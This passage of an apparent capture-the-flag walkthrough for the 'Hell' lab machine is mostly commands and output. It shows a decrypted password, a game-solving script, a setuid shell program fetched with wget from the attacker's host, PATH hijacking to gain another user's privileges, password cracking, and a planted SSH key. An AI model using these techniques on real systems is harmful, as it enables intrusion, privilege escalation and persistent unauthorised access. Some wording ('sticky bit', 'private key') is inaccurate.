</span><span class='line'>gpg: key 3F18AB0A: &ldquo;&lt;a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x6a;&#x61;&#99;&#x6b;&#64;&#x63;&#111;&#x77;&#x6c;&#111;&#x76;&#x65;&#114;&#115;&#x2e;&#99;&#111;&#x6d;">&#106;&#97;&#x63;&#107;&#x40;&#x63;&#111;&#x77;&#108;&#x6f;&#x76;&#x65;&#x72;&#115;&#x2e;&#x63;&#111;&#x6d;&lt;/a>&rdquo; not changed
</span><span class='line'>gpg: Total number processed: 1
</span><span class='line'>gpg:              unchanged: 1
</span><span class='line'>gpg:       secret keys read: 1
</span><span class='line'>gpg:   secret keys imported: 1
</span><span class='line'>$ gpg /var/mail/jack/received/message.eml&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>You need a passphrase to unlock the secret key for
</span><span class='line'>user: &ldquo;&lt;a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x6a;&#x61;&#99;&#x6b;&#x40;&#x63;&#111;&#x77;&#108;&#111;&#118;&#101;&#x72;&#x73;&#46;&#99;&#111;&#109;">&#x6a;&#x61;&#x63;&#x6b;&#x40;&#99;&#x6f;&#x77;&#108;&#x6f;&#118;&#x65;&#114;&#x73;&#46;&#99;&#x6f;&#x6d;&lt;/a>&rdquo;
</span><span class='line'>2048-bit RSA key, ID 3F18AB0A, created 2014-06-18&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
</span><span class='line'>gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
</span><span class='line'>      &ldquo;&lt;a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#58;&#106;&#x61;&#99;&#x6b;&#x40;&#99;&#111;&#119;&#x6c;&#x6f;&#x76;&#x65;&#x72;&#x73;&#x2e;&#99;&#x6f;&#109;">&#106;&#x61;&#99;&#107;&#64;&#x63;&#x6f;&#x77;&#x6c;&#x6f;&#118;&#x65;&#x72;&#x73;&#46;&#99;&#111;&#109;&lt;/a>&rdquo;
</span><span class='line'>gpg: /var/mail/jack/received/message.eml: unknown suffix
</span><span class='line'>Enter new filename [text.txt]:
</span><span class='line'>gpg: WARNING: message was not integrity protected
</span><span class='line'>$ cat text.txt
</span><span class='line'>Ok Jack. I&rsquo;ve created the account &lsquo;milk_4_life&rsquo; as per your request. Please stop emailing me about this now or I&rsquo;m going to talk to HR like we discussed.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>The password is &lsquo;4J0WWvL5nS&rsquo;
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure></p>

<p>Here we got user <code>milk_4_life</code> has password: <em><font color="red">4J0WWvL5nS</font></em></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ssh milk_4_life@localhost
</span><span class='line'>The authenticity of host &lsquo;localhost (::1)&rsquo; can&rsquo;t be established.
</span><span class='line'>ECDSA key fingerprint is e0:b0:ba:37:93:39:65:33:c6:44:99:50:2c:1b:f6:fa.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>Warning: Permanently added &lsquo;localhost&rsquo; (ECDSA) to the list of known hosts.
</span><span class='line'>milk_4_life@localhost&rsquo;s password:
</span><span class='line'>Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>The programs included with the Debian GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Sun Jul 12 07:02:03 2015 from 10.10.10.131
</span><span class='line'>$ id
</span><span class='line'>uid=1002(milk_4_life) gid=1002(milk_4_life) groups=1002(milk_4_life)
</span><span class='line'>$ pwd
</span><span class='line'>/home/milk_4_life
</span><span class='line'>$ ls -l
</span><span class='line'>total 12
</span><span class='line'>&mdash;s&ndash;x&ndash;x 1 george      george      5743 Jun 19  2014 game
</span><span class='line'>-rwxr-xr-x 1 milk_4_life milk_4_life  473 Jul 11 20:36 win.py
</span><span class='line'>$ ls -alh
</span><span class='line'>total 36K
</span><span class='line'>drwx&mdash;&mdash; 2 milk_4_life milk_4_life 4.0K Jul 12 06:59 .
</span><span class='line'>drwxr-xr-x 7 root        root        4.0K Jul  5  2014 ..
</span><span class='line'>-rw&mdash;&mdash;- 1 milk_4_life milk_4_life   51 Jul 12 07:24 .bash_history
</span><span class='line'>-rwx&mdash;&mdash; 1 milk_4_life milk_4_life    1 Jun 22  2014 .bash_logout
</span><span class='line'>-rwx&mdash;&mdash; 1 milk_4_life milk_4_life 3.4K Jan  1  2013 .bashrc
</span><span class='line'>&mdash;s&ndash;x&ndash;x 1 george      george      5.7K Jun 19  2014 game
</span><span class='line'>-rwx&mdash;&mdash; 1 milk_4_life milk_4_life  675 Jan  1  2013 .profile</span></code></pre></td></tr></table></div></figure></p>

<h2>Moving to <em>george</em></h2>

<p>Here we can see that there is program <code>game</code> which is owned by george and sticky bit has been set. That means this program has high possibility to be exploited for privilege escaping to george.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ss -lnt
</span><span class='line'>State      Recv-Q Send-Q                                               Local Address:Port                                                 Peer Address:Port
</span><span class='line'>LISTEN     0      50                                                       127.0.0.1:3306                                                            &lt;em>:&lt;/em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                              &lt;em>:57356                                                           &lt;/em>:&lt;em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                             :::111                                                            :::&lt;/em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                              &lt;em>:111                                                             &lt;/em>:&lt;em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                             :::80                                                             :::&lt;/em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                             :::59635                                                          :::&lt;em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                             :::22                                                             :::&lt;/em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                              &lt;em>:22                                                              &lt;/em>:&lt;em>   &lt;br/>
</span><span class='line'>LISTEN     0      20                                                             ::1:25                                                             :::&lt;/em>   &lt;br/>
</span><span class='line'>LISTEN     0      20                                                       127.0.0.1:25                                                              &lt;em>:&lt;/em>   &lt;br/>
</span><span class='line'>LISTEN     0      10                                                               &lt;em>:666                                                             &lt;/em>:*   &lt;br/>
</span><span class='line'>$ ./game &amp;
</span><span class='line'>$ I&rsquo;m listening&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>$ ss -lnt
</span><span class='line'>State      Recv-Q Send-Q                                               Local Address:Port                                                 Peer Address:Port
</span><span class='line'>LISTEN     0      50                                                       127.0.0.1:3306                                                            &lt;em>:&lt;/em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                              &lt;em>:57356                                                           &lt;/em>:&lt;em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                             :::111                                                            :::&lt;/em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                              &lt;em>:111                                                             &lt;/em>:&lt;em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                             :::80                                                             :::&lt;/em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                             :::59635                                                          :::&lt;em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                             :::22                                                             :::&lt;/em>   &lt;br/>
</span><span class='line'>LISTEN     0      128                                                              &lt;em>:22                                                              &lt;/em>:&lt;em>   &lt;br/>
</span><span class='line'>LISTEN     0      10                                                               &lt;/em>:1337                                                            &lt;em>:&lt;/em>   &lt;br/>
</span><span class='line'>LISTEN     0      20                                                             ::1:25                                                             :::&lt;em>   &lt;br/>
</span><span class='line'>LISTEN     0      20                                                       127.0.0.1:25                                                              &lt;/em>:&lt;em>   &lt;br/>
</span><span class='line'>LISTEN     0      10                                                               &lt;/em>:666                                                             &lt;em>:&lt;/em>   &lt;br/>
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure></p>

<p>After I run the game program and check listening ports, I found game is listening on port <em>1337</em>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ telnet 127.0.0.1 1337
</span><span class='line'>Trying 127.0.0.1&hellip;
</span><span class='line'>Connected to 127.0.0.1.
</span><span class='line'>Escape character is &lsquo;^]&rsquo;.
</span><span class='line'>Type &lsquo;START&rsquo; to begin&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>START
</span><span class='line'>Starting&hellip;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>You have 30 seconds to get as many points as you can, beat the high score! (High Score: 133723)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Quick what&rsquo;s&hellip; 769 x 49? 48
</span><span class='line'>Quick what&rsquo;s&hellip; 413 x 17? 15
</span><span class='line'>Quick what&rsquo;s&hellip; 779 x 106? 45
</span><span class='line'>Quick what&rsquo;s&hellip; 439 x 803? 55
</span><span class='line'>Quick what&rsquo;s&hellip; 555 x 341? 821
</span><span class='line'>Quick what&rsquo;s&hellip; 976 x 1?
</span><span class='line'>Lol nope&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Final Score: 0&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Connection closed by foreign host.
</span><span class='line'>[1] + Done                       ./game
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure></p>

<p>In order to win the game, I wrote a python script to calculate and send the result back to program.</p>

<p><figure class='code'><figcaption><span>my_win.py  (my_win.py)</span> <a href='/downloads/code/my_win.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">re</span>
</span><span class='line'>
</span><span class='line'><span class="n">ip</span> <span class="o">=</span> <span class="s">&quot;127.0.0.1&quot;</span>
</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">1337</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">conn</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">res</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;START/n&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">res</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class='line'>	<span class="n">res</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>	<span class="n">data</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">r&quot;Quick what&#39;s\.\.\. (.*)\?&quot;</span><span class="p">,</span> <span class="n">res</span><span class="p">)</span>
</span><span class='line'>	<span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>		<span class="k">print</span> <span class="s">&quot;pattern is not found!&quot;</span>
</span><span class='line'>		<span class="k">print</span> <span class="n">res</span>
</span><span class='line'>		<span class="k">break</span>
</span><span class='line'>	<span class="k">else</span><span class="p">:</span>
</span><span class='line'>		<span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39; x &#39;</span><span class="p">)</span>
</span><span class='line'>		<span class="n">rst</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="nb">int</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span><span class='line'>		<span class="k">print</span> <span class="n">rst</span>
</span><span class='line'>		<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">rst</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;[*] Done!&#39;</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>After running the script and win the game, something new appeared <code>I hear the faint sound of chmodding........</code>. That sounds like command <code>chmod</code> has been called after win the game.</p>

<p><img class="left" src="/downloads/Hell1/4.png"></p>

<p>Now I decided to check if the command <code>chmod</code> is called from absolute path or not. I upload setuid.c to target server&rsquo;s temporary directory <code>/tmp/</code>, compile it and change the name to <code>chmod</code>.</p>

<p><figure class='code'><figcaption><span>setuid.c  (setuid.c)</span> <a href='/downloads/code/setuid.c'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'> <span class="n">setuid</span><span class="p">(</span><span class="mi">1000</span><span class="p">);</span>
</span><span class='line'> <span class="n">system</span><span class="p">(</span> <span class="s">&quot;/bin/sh -i&quot;</span> <span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ wget &lt;a href="http://10.10.10.131/setuid.c">http://10.10.10.131/setuid.c&lt;/a>
</span><span class='line'>&ndash;2015-07-16 08:49:24&ndash;  &lt;a href="http://10.10.10.131/setuid.c">http://10.10.10.131/setuid.c&lt;/a>
</span><span class='line'>Connecting to 10.10.10.131:80&hellip; connected.
</span><span class='line'>HTTP request sent, awaiting response&hellip; 200 OK
</span><span class='line'>Length: 122 [text/x-csrc]
</span><span class='line'>Saving to: `setuid.c'&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>100%[======================================>] 122         &ndash;.-K/s   in 0s&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>2015-07-16 08:49:24 (14.9 MB/s) - `setuid.c' saved [122/122]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>$ ls -l
</span><span class='line'>total 4
</span><span class='line'>-rw-r&ndash;r&ndash; 1 milk_4_life milk_4_life 122 Jul 15 22:47 setuid.c
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure></p>

<p>Next I add <code>/tmp</code> to the beginning of the environmental PATH variable. Then I play the game and run python script to win.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ printenv PATH
</span><span class='line'>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</span><span class='line'>$ export PATH=/tmp:$PATH
</span><span class='line'>$ printenv PATH
</span><span class='line'>/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</span><span class='line'>$ ./game
</span><span class='line'>I&rsquo;m listening
</span><span class='line'>$ whoami
</span><span class='line'>george
</span><span class='line'>$ id
</span><span class='line'>uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure></p>

<p>Bingo! I am <code>george</code> now. After poking around in the file system, I found <code>container.tc</code> file (which is a Truecrypt encrypted file) in george&rsquo;s home directory. Also george has an email which shows a clue to crack the encrypted file by using rockyou password dictionary.</p>

<h2>Moving to <em>bazza</em></h2>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ pwd
</span><span class='line'>/home/george
</span><span class='line'>$ ls -l
</span><span class='line'>total 4096
</span><span class='line'>-rw&mdash;&mdash;- 1 george george 4194304 Jul 12 08:30 container.tc
</span><span class='line'>$ find / -user george -perm -g=s -o -perm -u=s -type f 2>/dev/null
</span><span class='line'>/usr/lib/openssh/ssh-keysign
</span><span class='line'>/usr/lib/pt_chown
</span><span class='line'>/usr/sbin/exim4
</span><span class='line'>/usr/bin/chsh
</span><span class='line'>/usr/bin/newgrp
</span><span class='line'>/usr/bin/sudo
</span><span class='line'>/usr/bin/procmail
</span><span class='line'>/usr/bin/chfn
</span><span class='line'>/usr/bin/gpasswd
</span><span class='line'>/usr/bin/passwd
</span><span class='line'>/usr/bin/sudoedit
</span><span class='line'>/usr/bin/game.py
</span><span class='line'>/usr/bin/lesson101
</span><span class='line'>/sbin/mount.nfs
</span><span class='line'>/var/mail/george
</span><span class='line'>/bin/umount
</span><span class='line'>/bin/ping
</span><span class='line'>/bin/su
</span><span class='line'>/bin/mount
</span><span class='line'>/bin/ping6
</span><span class='line'>$ ls -l /var/mail/george
</span><span class='line'>total 4
</span><span class='line'>-rw-r&ndash;r&ndash; 1 george george 175 Jun 20  2014 signup.eml
</span><span class='line'>$ cat /var/mail/george/signup.eml
</span><span class='line'>From: &lt;a href="&#109;&#97;&#105;&#108;&#116;&#111;&#x3a;&#x61;&#x64;&#x6d;&#x69;&#110;&#x40;&#x72;&#x6f;&#99;&#x6b;&#x79;&#x6f;&#117;&#46;&#x63;&#111;&#x6d;">&#97;&#x64;&#109;&#x69;&#x6e;&#64;&#x72;&#111;&#99;&#x6b;&#121;&#111;&#x75;&#x2e;&#x63;&#111;&#109;&lt;/a>
</span><span class='line'>To: &lt;a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#115;&#x75;&#x70;&#101;&#114;&#x5f;&#x61;&#x64;&#109;&#x69;&#110;&#64;&#x68;&#x65;&#108;&#108;&#46;&#99;&#111;&#109;">&#x73;&#117;&#112;&#101;&#114;&#x5f;&#97;&#100;&#109;&#105;&#110;&#64;&#x68;&#x65;&#108;&#108;&#46;&#99;&#x6f;&#x6d;&lt;/a>
</span><span class='line'>Subject: Account Activation
</span><span class='line'>Date: 13th November 2009&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Thanks for signing up for your account. I hope you enjoy our services.
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure></p>

<p>Then I downloaded the container file <code>container.tc</code> to my Kali and use <code>truecrack</code> with rockyou.txt to crack the password. Due to my laptop do not have a strong GPU so I could not take advantage of hashcat which is really disappointed. T.T</p>

<p>However, the hard way is still working, just a little slow&hellip; after waiting for a quite while, I finally cracked the password: <em><font color="red">letsyouupdateyourfunnotesandmore</font></em></p>

<p><img class="left" src="/downloads/Hell1/5.png"></p>

<p>In order to get a better shell with full privilege of george, I use ssh-keygen to generate a new ssh key pair (passphrase is <em><font color="red">test1337</font></em>) and upload the public key to target server as <code>.ssh/authorized_keys</code>. Then use the private key to login via SSH.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ssh-keygen
</span><span class='line'>Generating public/private rsa key pair.
</span><span class='line'>Enter file in which to save the key (/root/.ssh/id_rsa): g_id_rsa
</span><span class='line'>Enter passphrase (empty for no passphrase):
</span><span class='line'>Enter same passphrase again:
</span><span class='line'>Your identification has been saved in g_id_rsa.
</span><span class='line'>Your public key has been saved in g_id_rsa.pub.
</span><span class='line'>The key fingerprint is:
</span><span class='line'>81:82:98:44:59:c7:f2:68:fe:b8:76:04:f1:b1:a2:97 root@kali
</span><span class='line'>The key&rsquo;s randomart image is:
</span><span class='line'>+&ndash;[ RSA 2048]&mdash;-+
</span><span class='line'>|.oo&hellip;           |
</span><span class='line'>|.+ +.o .         |
</span><span class='line'>|o . B + .        |
</span><span class='line'>|   = =   .       |
</span><span class='line'>|  + +   S        |
</span><span class='line'>| . E .           |
</span><span class='line'>|  . +            |
</span><span class='line'>|   o o           |
</span><span class='line'>|  ..o            |
</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+</span></code></pre></td></tr></table></div></figure></p>

<p>Now back to target server to create <code>.ssh</code> folder and pull the SSH private key from my Kali.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ mkdir .ssh
</span><span class='line'>$ cd .ssh
</span><span class='line'>$ wget &lt;a href="http://10.10.10.131/g_id_rsa.pub">http://10.10.10.131/g_id_rsa.pub&lt;/a> -O authorized_keys
</span><span class='line'>&ndash;2015-07-16 10:19:59&ndash;  &lt;a href="http://10.10.10.131/g_id_rsa.pub">http://10.10.10.131/g_id_rsa.pub&lt;/a>
</span><span class='line'>Connecting to 10.10.10.131:80&hellip; connected.
</span><span class='line'>HTTP request sent, awaiting response&hellip; 200 OK
</span><span class='line'>Length: 391
</span><span class='line'>Saving to: `authorized_keys'&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>100%[==================================================================================================>] 391         &ndash;.-K/s   in 0s&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>2015-07-16 10:19:59 (59.7 MB/s) - `authorized_keys' saved [391/391]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>$ ls
</span><span class='line'>authorized_keys
</span><span class='line'>$ ls -l
</span><span class='line'>total 4
</span><span class='line'>-rw-r&ndash;r&ndash; 1 george milk_4_life 391 Jul 16 00:19 authorized_keys
</span><span class='line'>$ /bin/chmod 600 authorized_keys
</span><span class='line'>$ ls -l
</span><span class='line'>total 4
</span><span class='line'>-rw&mdash;&mdash;- 1 george milk_4_life 391 Jul 16 00:19 authorized_keys
